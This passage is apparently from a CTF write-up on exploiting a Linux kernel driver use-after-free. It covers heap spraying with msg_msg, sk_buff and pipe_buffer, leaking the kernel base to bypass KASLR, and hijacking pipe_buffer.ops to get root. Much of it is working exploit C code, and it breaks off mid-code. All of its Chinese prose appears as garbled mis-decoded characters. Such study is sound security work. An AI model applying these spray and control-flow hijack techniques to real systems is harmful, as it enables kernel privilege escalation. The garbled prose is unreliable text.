<p>æˆ‘ä»¬èšç„¦ç¬¬å…­è¡Œçš„&lt;pagesperslab&gt;ï¼Œè¯¥é¡¹ä»£è¡¨äº†æ¯ä¸€ä¸ªslabéœ€è¦çš„pageã€‚å¯ä»¥å‘ç°kmalloc-4kå’Œkmalloc-8kæ­£å¥½æ»¡è¶³order-3 page(8é¡µ)çš„éœ€æ±‚ï¼Œå› æ­¤æˆ‘ä»¬å°è¯•å †å–·å¤§å°ä¸º0x1000(å³kmalloc-4k)çš„ç»“æ„ä½“æ¥è§¦å‘<code>allocate_slab</code>å‡½æ•°ï¼Œæœ€ç»ˆåœ¨å‡½æ•°<code>alloc_slab_page</code>ä¸­è¿›è¡Œç›´æ¥çš„order-3é¡µåˆ†é…</p>
<h3 id="é”™è¯¯çš„å †å–·å¯¹è±¡ï¼šstruct-msg-msg"><a href="#é”™è¯¯çš„å †å–·å¯¹è±¡ï¼šstruct-msg-msg" class="headerlink" title="é”™è¯¯çš„å †å–·å¯¹è±¡ï¼šstruct msg_msg"></a>é”™è¯¯çš„å †å–·å¯¹è±¡ï¼šstruct msg_msg</h3><p>äº‹å®ä¸Šï¼Œæˆ‘çš„ç¬¬ä¸€ååº”å°±æ˜¯<code>struct msg_msg</code>ç»“æ„ä½“ï¼Œå› ä¸ºå®ƒkmallocä¸€æ¬¡ç”³è¯·çš„å¤§å°æœ€å¤§å°±æ˜¯0x1000ï¼Œäºæ˜¯å°è¯•å †å–·<code>struct msg_msg</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">spray</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_NUM 56</span></span><br><span class="line">  <span class="type">int</span> ms_qid[PRE_MSG_NUM];</span><br><span class="line">  <span class="type">char</span> *msg_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">  <span class="type">char</span> *msg_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_NUM; ++i) &#123;</span><br><span class="line">    ms_qid[i] = get_msg_queue();</span><br><span class="line">    <span class="built_in">memset</span>(msg_buf, (<span class="type">char</span>)i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write_msg(ms_qid[i], pre_msg_buf, <span class="number">0x1000</span> - <span class="number">0x30</span>, <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;pre spray msg_msg successfully\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹æ˜¯æ²¡é—®é¢˜çš„ï¼Œç”šè‡³ä¸éœ€è¦åˆ»æ„å–·å°„å¾ˆå¤šçš„ç»“æ„ä½“ï¼Œä¸€èˆ¬ç¬¬ä¸€æ³¢å°±èƒ½å–åˆ°kfreeåorder-3 pagesï¼Œé€šè¿‡UAFï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¡ä»¶æ»¡è¶³<code>arandom_ioctl</code>ä¸­çš„è¦æ±‚ï¼Œä»è€Œæ‹¿åˆ°å†…æ ¸åŸºå€ç»•è¿‡kaslr</p>
<p>ä¹‹åé—®é¢˜æ¥äº†ï¼Œä¸‹ä¸€æ­¥æˆ‘æ‰“ç®—å°†<code>struct msg_msg</code> freeæ‰ï¼Œæ¢æˆ<code>pipe_buffer</code>æ¥åˆ©ç”¨å…¶éšæœºä»»æ„å†™ï¼Œå´å‘ç°æ— è®ºå¦‚ä½•ä¹Ÿå †å–·ä¸ä¸­ã€‚</p>
<p>æœ€ååœ¨æºç å¤„å‘ç°é—®é¢˜ï¼ŒåŸæ¥è¯¥å†…æ ¸ç‰ˆæœ¬ä¸­<code>struct msg_msg</code>çš„ç¬¬ä¸€é¡µçš„åˆ†é…ä½¿ç”¨çš„æ˜¯è‡ªå·±ç‹¬ç«‹çš„kmem_cache:</p>
<blockquote>
<p>è¯¥ç‰¹æ€§å…¶å®åœ¨Linux v6.11ç‰ˆæœ¬å°±å¼•å…¥äº†</p>
</blockquote>
<figure class="highlight c"><figcaption><span>Linux v6.14.2 å®Œæ•´ç‰ˆ</span><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.14.2/source/ipc/msgutil.c#L64">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">alloc_msg</span><span class="params">(<span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line"> <span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line"> alen = min(len, DATALEN_MSG);</span><br><span class="line"> msg = kmem_buckets_alloc(msg_buckets, <span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL);</span><br><span class="line">  <span class="comment">// è¿™é‡Œä¸æ˜¯kmallocäº†</span></span><br><span class="line"> <span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"> msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"> msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"> len -= alen;</span><br><span class="line"> pseg = &amp;msg-&gt;next;</span><br><span class="line"> <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">  cond_resched();</span><br><span class="line"></span><br><span class="line">  alen = min(len, DATALEN_SEG);</span><br><span class="line">  seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line">    <span class="comment">// è¿™é‡Œä»ç„¶æ˜¯kmallocï¼Œä½†æ˜¯æˆ‘ä»¬å¾ˆéš¾åˆ©ç”¨</span></span><br><span class="line">  <span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="keyword">goto</span> out_err;</span><br><span class="line">  *pseg = seg;</span><br><span class="line">  seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">  pseg = &amp;seg-&gt;next;</span><br><span class="line">  len -= alen;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line"> free_msg(msg);</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>msg_buckets</code>çš„å®šä¹‰å°±åœ¨å…¶ä¸Šæ–¹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> kmem_buckets *msg_buckets __ro_after_init;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">init_msg_buckets</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"> msg_buckets = kmem_buckets_create(<span class="string">&quot;msg_msg&quot;</span>, SLAB_ACCOUNT,</span><br><span class="line">       <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg),</span><br><span class="line">       DATALEN_MSG, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">subsys_initcall(init_msg_buckets);</span><br></pre></td></tr></table></figure>

<p>åœ¨slabinfoé‡Œè¾¹å…¶å®ä¹Ÿæœ‰ä½“ç°ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bash-5.2# <span class="built_in">cat</span> /proc/slabinfo</span><br><span class="line">...</span><br><span class="line">msg_msg-8k             0      0   8192    4    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-4k             0      0   4096    8    8 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-2k             0      0   2048    8    4 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-1k             0      0   1024    8    2 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-512            0      0    512    8    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-256            0      0    256   16    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-128            0      0    128   32    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-64             0      0     64   64    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-32             0      0     32  128    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-16             0      0     16  256    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-8              0      0      8  512    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-192            0      0    192   21    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">msg_msg-96             0      0     96   42    1 : tunables    0    0    0 : slabdata      0      0      0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å¯è§å¤šäº†å’Œä¸€èˆ¬kmalloc-xxxä¸€æ ·çš„ä¸åŒå¤§å°çš„slab,æ„å‘³ç€å®ƒä»¬ä¸ä¼šä¸ç›¸åŒå¤§å°çš„kmalloc-xxxåˆå¹¶äº†ï¼Œä¹‹å‰çš„æƒ³æ³•å±äºcross-cacheï¼Œé™¤éæ„é€ cross-cache attack,å¦åˆ™æ˜¯ä¸å¯èƒ½æˆåŠŸçš„</p>
<h3 id="æ›´æ¢å †å–·å¯¹è±¡ï¼šstruct-sk-buff"><a href="#æ›´æ¢å †å–·å¯¹è±¡ï¼šstruct-sk-buff" class="headerlink" title="æ›´æ¢å †å–·å¯¹è±¡ï¼šstruct sk_buff"></a>æ›´æ¢å †å–·å¯¹è±¡ï¼šstruct sk_buff</h3><blockquote>
<p>ä¸ºæ­¤ä¸“é—¨çœ‹äº†ä¸€çœ¼æºç ï¼Œç¡®ä¿æ˜¯kmallocäº†ä¹‹åæ‰é‡‡ç”¨çš„</p>
</blockquote>
<p>åŒæ ·èƒ½å®Œæˆè¯»å†™æ•°æ®çš„å¯ä¾›å †å–·çš„ç»“æ„ä½“è¿˜æœ‰<code>struct sk_buff</code>ï¼Œæˆ‘ä»¬ä¸èƒ½åœ¨ä¸€æ£µæ ‘ä¸ŠåŠæ­»</p>
<p>è¿˜æ˜¯ä¹‹å‰çš„æ€è·¯ï¼Œå †å–·å–æ•°æ®éªŒè¯ï¼Œç„¶åå†™æ•°æ®æ»¡è¶³æ¡ä»¶ï¼Œæ‹¿åˆ°å†…æ ¸åŸºåœ°å€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">  <span class="comment">// INFO: Step 0x02: spray sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;spray sk_buff&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_reserve_size = <span class="number">320</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> skb_size = page_size - skb_reserve_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">  <span class="type">char</span> *skb_buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    check(socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]));</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf, (<span class="type">char</span>)i, skb_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf, <span class="string">&quot;hamoood&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(skb_buf + offset, <span class="number">0</span>, <span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset, &amp;AAA.rand_value, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x10</span>, &amp;AAA.rand_offset, <span class="number">0x4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(skb_buf + offset + <span class="number">0x18</span>, &amp;AAA.rand_size, <span class="number">0x4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(write(sk_sockets[i][<span class="number">0</span>], skb_buf, skb_size));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray sk_buff successfully\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// INFO: Step 0x03: check &amp; read sk_buff</span></span><br><span class="line">  step(<span class="string">&quot;check &amp; read sk_buff&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *skb_recv = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  check(ioctl(fd, <span class="number">0x1005</span>)); <span class="comment">// check</span></span><br><span class="line">  info(<span class="string">&quot;check buffer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;read sk_buff length %#x\n&quot;</span>, offset);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; ++j) &#123;</span><br><span class="line">      check(read(sk_sockets[i][<span class="number">1</span>], skb_recv, skb_size));</span><br><span class="line"></span><br><span class="line">      <span class="type">uint64_t</span> possible_addr = *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>);</span><br><span class="line">      <span class="keyword">if</span> ((possible_addr &amp; <span class="number">0xffffffff00000000</span>) == <span class="number">0xffffffff00000000</span>) &#123;</span><br><span class="line">        success(<span class="string">&quot;find kernel addr at No.%d: %#lx\n&quot;</span>, i,</span><br><span class="line">                *(<span class="type">uint64_t</span> *)(skb_recv + offset + <span class="number">0x20</span>));</span><br><span class="line">        kernel_base = possible_addr - calc(<span class="number">0xffffffff81907850</span>);</span><br><span class="line">        success(<span class="string">&quot;find kernel base: %#lx\n&quot;</span>, kernel_base);</span><br><span class="line">        <span class="keyword">goto</span> FIND;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (kernel_base == <span class="number">0</span>) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;not found&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å…¶å®è¿™ç§å †å–·åœ¨ç»“æ„ä½“<code>AAA</code>çš„<code>rand_size</code>æ»¡è¶³kmalloc-4kçš„æ—¶å€™ä¾æ—§ç®¡ç”¨ï¼Œç¨å¾®å¢åŠ äº†ä¸€ç‚¹æˆåŠŸç‡</p>
</blockquote>
<p>ä¾æ—§ä¸ç”¨å–·å°„å¾ˆå¤šå¯¹è±¡å°±å¯ä»¥æ‹¿åˆ°è¯¥order-3ã€‚æ¥ä¸‹æ¥å°±æ˜¯å°†å…¶freeæ‰ï¼Œæ¢<code>pipe_buffer</code>ä¸Šåœºå°è¯•æ§åˆ¶æ‰§è¡Œæµ</p>
<h3 id="æ§åˆ¶æ‰§è¡Œæµï¼šstruct-pipe-buffer"><a href="#æ§åˆ¶æ‰§è¡Œæµï¼šstruct-pipe-buffer" class="headerlink" title="æ§åˆ¶æ‰§è¡Œæµï¼šstruct pipe_buffer"></a>æ§åˆ¶æ‰§è¡Œæµï¼šstruct pipe_buffer</h3><p>ä¹‹å‰è¯´è¿‡ï¼Œåœ¨æ²¡æœ‰smep&#x2F;smapçš„æƒ…å†µä¸‹ï¼Œåªè¦èƒ½è®©æ‰§è¡Œæµå¯¼å‘ç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬å°±èƒ½get rootï¼ˆå½“ç„¶å‰ææ˜¯æ‹¿åˆ°åŸºåœ°å€ï¼‰ã€‚<br>å› æ­¤ï¼Œ<code>pipe_buffer</code>è¿™ä¸€å¯æ§å¤§å°ï¼Œèƒ½å¤Ÿè¢«åŠ«æŒæ§åˆ¶æµï¼ˆåªéœ€åŠ«æŒå‡½æ•°è¡¨<code>struct pipe_buf_operations *ops</code>ï¼‰ï¼Œä¸”å†…å®¹é‡å¤ï¼ˆä¸º0x28å¤§å°çš„ç»“æ„ä½“æ•°ç»„ï¼‰ï¼Œéšæœºå‘½ä¸­ç‡é«˜çš„ç»“æ„ä½“å°±è‡ªç„¶è€Œç„¶åœ°æˆä¸ºè¿™ä¸€æ­¥åˆ©ç”¨çš„é¦–é€‰ç»“æ„ä½“</p>
<blockquote>
<p>å¤ªé€‚åˆäº†</p>
</blockquote>
<p><code>struct sk_buff</code>åœ¨è¯»å®Œæ•°æ®åè‡ªåŠ¨<code>kfree</code>ï¼Œè€Œæˆ‘å–æ•°æ®çš„æ–¹æ³•å°±æ˜¯å°†å…¶è¯»ç©ºï¼Œå› æ­¤ä¸éœ€è¦é¢å¤–æ“ä½œå°†å…¶freeæ‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">FIND:</span><br><span class="line">  <span class="comment">// INFO: Step 0x04: spray pipe_buffer</span></span><br><span class="line">  step(<span class="string">&quot;spray pipe_buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="type">void</span> *page;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">void</span> *ops;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">  &#125; pipe_example;</span><br><span class="line"></span><br><span class="line">  pipe_example.page = (<span class="type">void</span> *)<span class="number">0xffffea0000000000</span>;</span><br><span class="line">  pipe_example.len = <span class="number">0x1000</span>;</span><br><span class="line">  pipe_example.offset = <span class="number">0x0</span>;</span><br><span class="line">  pipe_example.ops = (<span class="type">void</span> *)calc(<span class="number">0xffffffff8222bb80</span>);</span><br><span class="line">  pipe_example.ops = <span class="literal">NULL</span>;</span><br><span class="line">  pipe_example.flags = <span class="number">0x10</span>;</span><br><span class="line">  pipe_example.private = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> pipe_buffer_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pipe_buffer);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;pipe_buffer size: %#lx\n&quot;</span>, pipe_buffer_size);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_num = <span class="number">0x10</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint64_t</span> pipe_buf_size = page_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> inner_pipe_offset = offset % pipe_buffer_size;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *pipe_buf = <span class="built_in">malloc</span>(pipe_buf_size);</span><br><span class="line">  <span class="type">int</span> pipe_fd[pipe_num][<span class="number">2</span>];</span><br><span class="line">  <span class="comment">// anon_pipe_buf_ops</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pipe_num; ++i) &#123;</span><br><span class="line">    check(pipe(pipe_fd[i]));</span><br><span class="line">    <span class="built_in">memset</span>(pipe_buf, i, pipe_buf_size);</span><br><span class="line">    <span class="built_in">memcpy</span>(pipe_buf, <span class="string">&quot;find__me&quot;</span>, <span class="number">0x8</span>);</span><br><span class="line">    check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, pipe_buf_size));</span><br><span class="line">    check(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">0x1000</span> * <span class="number">64</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">0x1</span>; ++j) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(pipe_buf + <span class="number">0x8</span>, j, <span class="number">0x8</span>);</span><br><span class="line">      check(write(pipe_fd[i][<span class="number">1</span>], pipe_buf, <span class="number">0x1000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  success(<span class="string">&quot;spray pipe_buffer successfully\n&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å †å–·<code>pipe_buffer</code>å¹¶å°†å…¶å¤§å°æ”¹æˆé€‚åˆkmalloc-4kçš„ï¼Œä¹Ÿæ˜¯ä¸éœ€è¦å¾ˆå¤šå°±èƒ½å–åˆ°åˆšè¢«freeçš„<code>sk_buff</code></p>
<p>æœ€åä¸€æ­¥å°±æ˜¯å›å½’æœ€åˆçš„<code>arandom_ioctl</code>ï¼Œè°ƒç”¨å…¶éšæœºå†™çš„åŠŸèƒ½ï¼Œå°è¯•åŠ«æŒæ§åˆ¶æµ<br>å…¶å®å°±æ˜¯ä¸€ä¸ªå¾ˆç¢°è¿æ°”çš„è¿‡ç¨‹ï¼Œè¦æ±‚æ˜¯åªè¦èƒ½å¤Ÿå°†<code>pipe_buffer.ops</code>åŸŸè¦†å†™æˆä¸€ä¸ªç”¨æˆ·æ€åœ°å€å³å¯ï¼Œåœ¨ç”¨æˆ·æ€æˆ‘ä»¬ç›´æ¥mmapä¼ªé€ å…¶å‡½æ•°è¡¨å¯¼å‘ææƒä»£ç å³å¯<br>å¦‚æœçœŸç¢°è¿æ°”ä¸­äº†ï¼Œåªéœ€å°†å…¶closeæ‰å°±èƒ½è§¦å‘äº†</p>
<blockquote>
<p>åŸç†å°±æ˜¯<code>pipe_buffer</code>åœ¨closeçš„è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨å‡½æ•°<code>free_pipe_info</code>ï¼Œå…¶å…³é”®å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>å¯è§ï¼Œå®ƒä¸ç®¡ä½ å…¶ä»–åœ°æ–¹æœ‰æ²¡æœ‰æ•°æ®ï¼Œåªè¦opsåŸŸä¸ä¸º0,å°±å°è¯•è°ƒç”¨ï¼ˆè¯¥å¾ªç¯è¿˜æ˜¯éå†æ‰€æœ‰<code>pipe_buffer</code>ç»“æ„ä½“æ•°ç»„çš„ï¼‰<br>å› æ­¤ï¼Œåªè¦å¾€ä¸Šè¾¹å†™ä¸Šä¸œè¥¿ï¼Œå°±èƒ½åŠ«æŒæ§åˆ¶æµäº†</p>
</blockquote>
<p>æœ€åä¸€éƒ¨åˆ†</p>
<blockquote>
<p>å…¶å®è¿™ä¸ªéšæœºéªŒè¯æ˜¯å¦è¦†å†™<code>pipe_buffer.ops</code>åŸŸå®Œå…¨å¯ä»¥æ”¾åœ¨æœ€å‰è¾¹</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 